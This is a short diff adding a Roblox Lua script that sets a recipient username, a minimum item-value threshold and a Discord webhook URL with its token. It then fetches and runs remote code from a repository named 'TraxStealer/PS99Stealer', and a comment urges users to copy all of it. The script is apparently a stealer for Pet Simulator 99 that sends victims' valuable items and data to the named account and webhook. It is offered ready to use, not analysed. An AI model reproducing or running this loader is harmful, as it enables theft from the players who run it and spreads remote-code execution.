@@ -1,0 +1,6 @@
+Username = "Lamprinosss"
+Username2 = "Lamprinosss"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1343747833131700305/zDN72s--YywD2nrTCTX01j_YdCSlm7ljHPyPNdeHR0Avh1xTDq-XC6APeMMNG-2VBOET"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() -- copy the whole thing, even the username =
